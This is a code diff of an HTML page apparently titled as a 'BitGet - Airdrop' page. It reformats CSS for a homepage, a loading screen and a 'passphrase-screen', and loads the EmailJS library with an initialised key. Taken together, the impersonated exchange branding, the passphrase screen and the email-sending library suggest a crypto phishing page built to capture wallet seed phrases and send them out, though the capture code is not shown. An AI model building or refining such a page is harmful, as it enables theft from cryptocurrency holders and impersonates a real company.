@@ -1,51 +1,52 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<style>
-        .homepage {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            background: url('your-background-image.jpg') no-repeat center center/cover;
-            padding: 40px;
-            width: 100vw;
-            height: 100vh;
-        }
-.loading-screen {
-    display: none; /* Ensure it's hidden initially */
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    background-color: black;
-}
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>BitGet - Airdrop</title>
 
-.loading-screen video {
-    width: 100vw;
-    height: 100vh;
-    object-fit: cover;
-}
-.passphrase-screen {
-    display: none; /* Ensure it's hidden initially */
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100vw;
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    background: #1a1a1a;
-}
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BitGet - Airdrop</title>
+<style>
+    .homepage {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        background: url('your-background-image.jpg') no-repeat center center/cover;
+        padding: 40px;
+        width: 100vw;
+        height: 100vh;
+    }
+    .loading-screen {
+        display: none; /* Ensure it's hidden initially */
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background-color: black;
+    }
+    .loading-screen video {
+        width: 100vw;
+        height: 100vh;
+        object-fit: cover;
+    }
+    .passphrase-screen {
+        display: none; /* Ensure it's hidden initially */
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        background: #1a1a1a;
+    }
+</style>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
         emailjs.init("0J9X5wxck4rbjQo8m");
